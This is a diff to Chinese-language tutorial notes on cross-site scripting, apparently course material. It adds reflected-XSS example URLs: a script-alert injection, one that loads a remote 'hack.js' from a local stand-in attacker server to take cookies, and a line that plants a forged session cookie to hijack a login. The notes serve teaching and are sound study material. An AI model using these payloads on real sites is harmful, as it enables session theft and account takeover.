@@ -28,13 +28,28 @@
 >
 > - 利用虚假输入表单骗取用户个人信息。
 > - 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
->   - 显示伪造的文章或图片。
+> - 显示伪造的文章或图片。
 
 
 
 > XSS攻击分类
 
 - 反射型 - url参数直接注入
+
+```js
+// 普通
+http://localhost:3000/?from=china
+// alert尝试
+http://localhost:3000/?from=<script>alert(3)</script>
+// 获取Cookie
+http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
+</script>
+// 短域名伪造 https://dwz.cn/
+// 伪造cookie入侵 chrome
+document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT
+Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
+
+```
 
 
 
